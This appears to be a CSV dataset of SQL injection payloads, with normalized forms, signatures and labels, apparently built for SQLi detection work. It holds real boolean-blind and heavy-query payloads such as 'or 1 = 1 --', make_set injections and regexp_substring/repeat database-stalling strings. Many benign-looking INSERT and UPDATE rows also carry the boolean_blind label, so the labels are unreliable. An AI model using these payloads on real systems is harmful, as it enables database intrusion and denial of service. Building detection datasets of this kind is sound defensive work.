id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree,payload_norm,wrapper_detected,strip_depth,payload_delex_v2,signature,tier
3266,"INSERT INTO fill ( flow, mighty, apple, combination, dance, allow ) VALUES ( 'pile', 'birds'. detail', 'long', 'image', 'particles', 'have' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 141 chars.,2,"INSERT INTO fill ( flow, mighty, apple, combination, dance, allow ) VALUES ( 'pile', 'birds'. detail', 'long', 'image', 'particles', 'have' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
4751,"INSERT INTO laugh ( ants, increase, youth, fight, breath, pride ) VALUES ( 'rough', 'freedom'. victory', 'hardly', 'took', 'standard', 'easier' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 145 chars.,2,"INSERT INTO laugh ( ants, increase, youth, fight, breath, pride ) VALUES ( 'rough', 'freedom'. victory', 'hardly', 'took', 'standard', 'easier' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
10383,"INSERT INTO thirty ( stems, prepare, sure, lovely, surface, food ) VALUES ( 'cap', 'view'. official', 'learn', 'buffalo', 'giant', 'fish' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 139 chars.,2,"INSERT INTO thirty ( stems, prepare, sure, lovely, surface, food ) VALUES ( 'cap', 'view'. official', 'learn', 'buffalo', 'giant', 'fish' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
5683,"INSERT INTO die ( smallest, rice, measure, these, truth, distance ) VALUES ( 'court', 'live'. five', 'boy', 'package', 'determine', 'seven' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 141 chars.,2,"INSERT INTO die ( smallest, rice, measure, these, truth, distance ) VALUES ( 'court', 'live'. five', 'boy', 'package', 'determine', 'seven' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
34672,"INSERT INTO mass ( gain, written, lunch, allow, might, prove ) VALUES ( 'suit', 'root'. pressure', 'given', 'lose', 'writer', 'country' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 137 chars.,2,"INSERT INTO mass ( gain, written, lunch, allow, might, prove ) VALUES ( 'suit', 'root'. pressure', 'given', 'lose', 'writer', 'country' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
3827,"INSERT INTO stranger ( outside, choice, too, sea, root, smile ) VALUES ( 'likely', 'third'. deep', 'adult', 'straw', 'energy', 'dog' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 134 chars.,2,"INSERT INTO stranger ( outside, choice, too, sea, root, smile ) VALUES ( 'likely', 'third'. deep', 'adult', 'straw', 'energy', 'dog' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
9491,"INSERT INTO thumb ( poem, silence, tonight, active, shoot, fort ) VALUES ( 'clothing', 'shore'. canal', 'vapor', 'task', 'either', 'unless' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 141 chars.,2,"INSERT INTO thumb ( poem, silence, tonight, active, shoot, fort ) VALUES ( 'clothing', 'shore'. canal', 'vapor', 'task', 'either', 'unless' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
7910,"INSERT INTO vote ( flat, trap, card, score, correctly, law ) VALUES ( 'market', 'chose'. zero', 'within', 'gas', 'waste', 'screen' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 132 chars.,2,"INSERT INTO vote ( flat, trap, card, score, correctly, law ) VALUES ( 'market', 'chose'. zero', 'within', 'gas', 'waste', 'screen' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
5124,"INSERT INTO simple ( darkness, ice, joy, loose, instead, settle ) VALUES ( 'scale', 'clean'. therefore', 'necessary', 'want', 'loss', 'earn' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 142 chars.,2,"INSERT INTO simple ( darkness, ice, joy, loose, instead, settle ) VALUES ( 'scale', 'clean'. therefore', 'necessary', 'want', 'loss', 'earn' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
7631,"INSERT INTO population ( missing, therefore, particularly, other, herself, yes ) VALUES ( 'product', 'shop'. time', 'active', 'active', 'open', 'before' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 154 chars.,2,"INSERT INTO population ( missing, therefore, particularly, other, herself, yes ) VALUES ( 'product', 'shop'. time', 'active', 'active', 'open', 'before' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
8564,"INSERT INTO driven ( your, country, welcome, popular, salt, wherever ) VALUES ( 'fox', 'community'. bet', 'heavy', 'dog', 'replace', 'sister' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 143 chars.,2,"INSERT INTO driven ( your, country, welcome, popular, salt, wherever ) VALUES ( 'fox', 'community'. bet', 'heavy', 'dog', 'replace', 'sister' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
5961,"INSERT INTO stronger ( floating, hollow, barn, note, without, property ) VALUES ( 'discovery', 'airplane'. creature', 'composition', 'fall', 'high', 'grandfather' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 164 chars.,2,"INSERT INTO stronger ( floating, hollow, barn, note, without, property ) VALUES ( 'discovery', 'airplane'. creature', 'composition', 'fall', 'high', 'grandfather' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
7724,"INSERT INTO help ( grandfather, lungs, trail, time, closer, tongue ) VALUES ( 'mistake', 'means'. surprise', 'outer', 'porch', 'beside', 'captain' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 148 chars.,2,"INSERT INTO help ( grandfather, lungs, trail, time, closer, tongue ) VALUES ( 'mistake', 'means'. surprise', 'outer', 'porch', 'beside', 'captain' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
8936,"INSERT INTO brick ( corner, fur, struck, green, education, fellow ) VALUES ( 'through', 'age'. cell', 'belong', 'whom', 'story', 'driving' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 140 chars.,2,"INSERT INTO brick ( corner, fur, struck, green, education, fellow ) VALUES ( 'through', 'age'. cell', 'belong', 'whom', 'story', 'driving' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
5870,"INSERT INTO highest ( opinion, heavy, paragraph, party, ball, chance ) VALUES ( 'feed', 'inside'. process', 'rough', 'got', 'power', 'base' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 141 chars.,2,"INSERT INTO highest ( opinion, heavy, paragraph, party, ball, chance ) VALUES ( 'feed', 'inside'. process', 'rough', 'got', 'power', 'base' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
10746,"INSERT INTO sudden ( anybody, turn, faster, replace, tune, rose ) VALUES ( 'coast', 'seven'. wear', 'basket', 'gave', 'count', 'worry' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 136 chars.,2,"INSERT INTO sudden ( anybody, turn, faster, replace, tune, rose ) VALUES ( 'coast', 'seven'. wear', 'basket', 'gave', 'count', 'worry' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
2799,"INSERT INTO baseball ( wrote, shall, your, half, rabbit, party ) VALUES ( 'meal', 'ranch'. dead', 'engineer', 'steep', 'unusual', 'service' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 141 chars.,2,"INSERT INTO baseball ( wrote, shall, your, half, rabbit, party ) VALUES ( 'meal', 'ranch'. dead', 'engineer', 'steep', 'unusual', 'service' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
9677,"INSERT INTO depth ( class, stuck, particles, sister, type, bell ) VALUES ( 'swam', 'sick'. whatever', 'pleasant', 'foot', 'yesterday', 'wrong' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 144 chars.,2,"INSERT INTO depth ( class, stuck, particles, sister, type, bell ) VALUES ( 'swam', 'sick'. whatever', 'pleasant', 'foot', 'yesterday', 'wrong' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
9769,"INSERT INTO up ( simple, radio, act, combination, since, till ) VALUES ( 'example', 'level'. took', 'account', 'at', 'dug', 'morning' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 135 chars.,2,"INSERT INTO up ( simple, radio, act, combination, since, till ) VALUES ( 'example', 'level'. took', 'account', 'at', 'dug', 'morning' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
34474,"INSERT INTO earlier ( military, highest, anyone, house, almost, quite ) VALUES ( 'jet', 'division'. one', 'film', 'shot', 'ago', 'clearly' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 140 chars.,2,"INSERT INTO earlier ( military, highest, anyone, house, almost, quite ) VALUES ( 'jet', 'division'. one', 'film', 'shot', 'ago', 'clearly' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,silver
1392,-5534 or 1983 = 5721#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2,-5534 or 1983 = 5721#,False,0,-__INT__ or __INT__ = __INT__#,ddaccd05,silver
19069,-9212 or 1026 = 7967#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2,-9212 or 1026 = 7967#,False,0,-__INT__ or __INT__ = __INT__#,ddaccd05,silver
19583,-9217 or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2,-9217 or 9323 = 9323#,False,0,-__INT__ or __INT__ = __INT__#,ddaccd05,silver
19919,-7369 or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2,-7369 or 9323 = 9323#,False,0,-__INT__ or __INT__ = __INT__#,ddaccd05,silver
21415,-8710 or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2,-8710 or 9323 = 9323#,False,0,-__INT__ or __INT__ = __INT__#,ddaccd05,silver
22144,-3243 or 2266 = 3583#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2,-3243 or 2266 = 3583#,False,0,-__INT__ or __INT__ = __INT__#,ddaccd05,silver
6706,"INSERT INTO gold ( twice, else, post, direct, favorite, wear ) VALUES ( 'shelf', 'sum'. bent', 'merely', 'struggle', 'great', 'longer' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 136 chars.,2,"INSERT INTO gold ( twice, else, post, direct, favorite, wear ) VALUES ( 'shelf', 'sum'. bent', 'merely', 'struggle', 'great', 'longer' )",False,0,"insert into __IDENT__ ( __IDENT__ , else , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",ddcc0ac6,silver
2198,"-5158' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 'noaj' like 'noaj",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 69 chars.,1,"-5158' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 'noaj' like 'noaj",False,0,-5158__STR__noaj__STR__noaj,de37cb5d,silver
18892,"end and ( ( ( ""poee"" = ""poee",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,1,"end and ( ( ( ""poee"" = ""poee",False,0,"end and ( ( ( __STR__ = ""__IDENT__",de5c9435,silver
19390,"end and ( ( ( ""revx"" = ""revx",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,1,"end and ( ( ( ""revx"" = ""revx",False,0,"end and ( ( ( __STR__ = ""__IDENT__",de5c9435,silver
19872,end and ( ( ( 'nhub' = 'nhub,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,1,end and ( ( ( 'nhub' = 'nhub,False,0,end and ( ( ( __STR__ = '__IDENT__,dfaaec9f,silver
23986,end and ( ( ( 'gqhc' = 'gqhc,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,1,end and ( ( ( 'gqhc' = 'gqhc,False,0,end and ( ( ( __STR__ = '__IDENT__,dfaaec9f,silver
24439,end and ( ( ( 'xzbk' = 'xzbk,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,1,end and ( ( ( 'xzbk' = 'xzbk,False,0,end and ( ( ( __STR__ = '__IDENT__,dfaaec9f,silver
24680,end and ( ( ( 'ycte' = 'ycte,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,1,end and ( ( ( 'ycte' = 'ycte,False,0,end and ( ( ( __STR__ = '__IDENT__,dfaaec9f,silver
924,1 and ( 3020 = 3020 ) *6703# syuj,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 33 chars.,1,1 and ( 3020 = 3020 ) *6703# syuj,False,0,__INT__ and ( __INT__ = __INT__ ) * __INT__# __IDENT__,dfb05903,silver
21909,1 and ( 5369 = 8325 ) *8325# psze,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 33 chars.,1,1 and ( 5369 = 8325 ) *8325# psze,False,0,__INT__ and ( __INT__ = __INT__ ) * __INT__# __IDENT__,dfb05903,silver
1396,"-5439"" or 2559 = 4692 and ""dcrf"" like ""dcrf",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 43 chars.,2,"-5439"" or 2559 = 4692 and ""dcrf"" like ""dcrf",False,0,-5439__STR__dcrf__STR__dcrf,dfdb5ef7,silver
891,"1%"" ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1%"" ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",False,0,"__INT__ % "" ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",dfe341e2,silver
882,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""qwdi"" = ""qwdi",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""qwdi"" = ""qwdi",False,0,"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __STR__ = ""__IDENT__",dff988a3,silver
3640,"INSERT INTO shot ( group, daughter, busy, slow, check, completely ) VALUES ( 'combination', 'personal'. dog', 'closely', 'hot', 'desk', 'hurt' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 144 chars.,2,"INSERT INTO shot ( group, daughter, busy, slow, check, completely ) VALUES ( 'combination', 'personal'. dog', 'closely', 'hot', 'desk', 'hurt' )",False,0,"insert into __IDENT__ ( group , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",e069c42f,silver
13,or 1 = 1 --,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 11 chars.,2,or 1 = 1 --,False,0,or __INT__ = __INT__ --,e07e1d6c,silver
54,or 1 = 1--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 10 chars.,2,or 1 = 1--,False,0,or __INT__ = __INT__ --,e07e1d6c,silver
18837,"1 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",False,0,"__INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",e0900e17,silver
22660,"1"" where 4991 = 4991 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" where 4991 = 4991 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",False,0,"__INT__"" where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",e158e8e5,silver
25223,"1"" where 5236 = 5236 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" where 5236 = 5236 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",False,0,"__INT__"" where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",e158e8e5,silver
1003,"1"" where 4633 = 4633 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" where 4633 = 4633 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",False,0,"__INT__"" where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",e160a9e9,silver
21482,1' and 7533 = 7533 and 'clqy' like 'clqy,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2,1' and 7533 = 7533 and 'clqy' like 'clqy,False,0,1__STR__clqy__STR__clqy,e244c937,silver
19036,"1' ) and make_set ( 4551 = 6487,6487 ) and ( 'jnqa' = 'jnqa",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 59 chars.,1,"1' ) and make_set ( 4551 = 6487,6487 ) and ( 'jnqa' = 'jnqa",False,0,1__STR__jnqa__STR__jnqa,e2cc6d7f,silver
33706,UPDATE Customers SET ContactName = 'Juan'WHERE Country = 'Mexico';,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 66 chars.,2,UPDATE Customers SET ContactName = 'Juan'WHERE Country = 'Mexico';,False,0,update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__ ;,e2cf9c01,silver
18381,"end and ""xouo"" like ""xouo",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,1,"end and ""xouo"" like ""xouo",False,0,"end and __STR__ like ""__IDENT__",e2d6514e,silver
18842,"end and ""mdje"" like ""mdje",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,1,"end and ""mdje"" like ""mdje",False,0,"end and __STR__ like ""__IDENT__",e2d6514e,silver
21399,"1"" where 4294 = 4294 and make_set ( 2543 = 7988,7988 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 57 chars.,2,"1"" where 4294 = 4294 and make_set ( 2543 = 7988,7988 ) --",False,0,"__INT__"" where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",e325b17d,silver
25618,"1"" where 1809 = 1809 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 57 chars.,2,"1"" where 1809 = 1809 and make_set ( 8403 = 8403,8899 ) --",False,0,"__INT__"" where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",e325b17d,silver
18816,"1' in boolean mode ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' in boolean mode ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",False,0,"__INT__' in __IDENT__ __IDENT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) #",e3b39585,silver
19134,-1760 ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 1541 = 1541,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,1,-1760 ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 1541 = 1541,False,0,-__INT__ ) ) ) or ( __INT__ = __INT__ ) * __INT__ and ( ( ( __INT__ = __INT__,e4160bef,silver
21527,-4835 ) ) ) or ( 4219 = 2081 ) *2081 and ( ( ( 8536 = 8536,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,1,-4835 ) ) ) or ( 4219 = 2081 ) *2081 and ( ( ( 8536 = 8536,False,0,-__INT__ ) ) ) or ( __INT__ = __INT__ ) * __INT__ and ( ( ( __INT__ = __INT__,e4160bef,silver
19185,1' ) and 7533 = 7533 and ( 'dbjq' = 'dbjq,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2,1' ) and 7533 = 7533 and ( 'dbjq' = 'dbjq,False,0,1__STR__dbjq__STR__dbjq,e417c7cb,silver
19218,"1"" ) ) ) and 4124 = 7245 and ( ( ( ""tuom"" = ""tuom",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,2,"1"" ) ) ) and 4124 = 7245 and ( ( ( ""tuom"" = ""tuom",False,0,1__STR__tuom__STR__tuom,e42646b4,silver
633,"1"" ) where 9285 = 9285 and 8506 = 8343#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2,"1"" ) where 9285 = 9285 and 8506 = 8343#",False,0,"__INT__"" ) where __INT__ = __INT__ and __INT__ = __INT__#",e45b88ab,silver
24978,"1"" ) where 9962 = 9962 and 4595 = 4595#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2,"1"" ) where 9962 = 9962 and 4595 = 4595#",False,0,"__INT__"" ) where __INT__ = __INT__ and __INT__ = __INT__#",e45b88ab,silver
19967,"1"" and ( 3020 = 3020 ) *6703 and ""itpt"" = ""itpt",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 47 chars.,1,"1"" and ( 3020 = 3020 ) *6703 and ""itpt"" = ""itpt",False,0,1__STR__itpt__STR__itpt,e5496acf,silver
